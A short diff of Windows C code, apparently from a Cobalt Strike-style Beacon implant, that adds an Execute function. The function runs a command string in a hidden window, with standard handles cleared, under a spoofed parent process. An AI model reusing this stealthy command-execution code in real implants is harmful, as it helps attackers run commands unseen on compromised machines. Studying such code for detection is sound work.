@@ -1247,3 +1247,26 @@ void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
 	if (pInfo->hThread)
 		CloseHandle(pInfo->hThread);
 }
+
+
+void Execute(char* buffer, int length)
+{
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	GetStartupInfoA(&si);
+	si.wShowWindow = SW_HIDE;
+	memset(&si.hStdInput, 0, sizeof(si.hStdInput));
+	memset(&si.hStdOutput, 0, sizeof(si.hStdOutput));
+	memset(&si.hStdError, 0, sizeof(si.hStdError));
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+
+#define MAX_CMD 1024
+	if (length >= MAX_CMD)
+		return;
+
+	char cmd[MAX_CMD];
+	strncpy(cmd, buffer, length);
+	cmd[length] = 0;
+	RunUnderParent(cmd, length, &si, &pi, 0, FALSE);
+	BeaconCleanupProcess(&pi);
+}
